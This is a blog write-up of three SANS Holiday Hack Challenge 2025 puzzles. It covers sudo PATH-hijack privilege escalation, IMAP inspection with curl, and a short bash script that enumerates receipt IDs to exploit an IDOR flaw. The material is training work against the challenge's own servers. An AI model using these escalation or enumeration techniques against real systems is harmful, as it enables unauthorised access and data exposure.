---
title: "SANS Holiday Hack Challenge™ 2025"
date: 2025-11-11T00:00:00Z
draft: false
description: "Write-up for the SANS Holiday Hack Challenge 2025."
---

## SANS Holiday Hack Challenge™ 2025
This post will include some of my favorite challenges from the 2025 HHC.

### Neighborhood Watch Bypass
The challenge involves privesc from a linux box. Let's start with everyone's favorite sudo -l command.
{{< image src="/assets/HHC/HHC_sudo_l.png" alt="sudo -l" width="1200" linked="false" class="center-image" >}}
We can quickly see that the secure_path starts with a path that we control. Let's view the system_status.sh to find any commands that are not shell bultin. 
{{< image src="/assets/HHC/type_a.png" alt="type -a" width="1200" linked="false" class="center-image" >}}
We can see that 'w' is not a shell builtin, so let's add it to the path we control.
{{< image src="/assets/HHC/w.png" alt="w" width="1200" linked="false" class="center-image" >}}
Pretty fun and easy privesc using PATH.

### Mail Detective
This challenge involves finding the mailicious pastebin URL connecting to IMAP only using curl.
We can start by listing mail folders.
{{< image src="/assets/HHC/list.png" alt="list mailboxes" width="1200" linked="false" class="center-image" >}}
Now we can investigate each folder individually.
{{< image src="/assets/HHC/fetch.png" alt="list spam emails" width="1200" linked="false" class="center-image" >}}
Let's pipe the output to a file using '2>&1' which redirects stderr (2) into stdout (1), so both streams go into spam.txt. Then we can grep the file using domain regex.
{{< image src="/assets/HHC/spam.png" alt="spam.txt" width="1200" linked="false" class="center-image" >}}

### IDORable Bistro
Opening the challenge we get a link to [https://its-idorable.holidayhackchallenge.com/](https://its-idorable.holidayhackchallenge.com/), view page source to find an example receipt URI (/receipt/a1b2c3d4). Quick calculations of IDORing the a1b2c3d4 string would take 4,569,760,000, so it is probably not that. If we view the receipt with the network tab open we find an API request.
{{< image src="/assets/HHC/network.png" alt="network tab" width="1200" linked="false" class="center-image" >}}
We can see the endpoint id= is vulnerable to IDORable. Let's write a quick script to fetch the results of all IDs 100-200.

```sh
#!/bin/bash

# Output file
output_file="receipts.json"

# Clear the output file if it exists
> "$output_file"

# Loop from 100 to 200
for id in $(seq 100 200); do
    # Fetch the receipt
    response=$(curl -s "https://its-idorable.hhc25-ops.com/api/receipt?id=$id")
    
    # Check if the response contains the error message
    if [[ "$response" != '{"error":"Receipt not found"}' ]]; then
        echo "$response" >> "$output_file"
    fi
done

echo "Done. Valid receipts saved to $output_file."
```

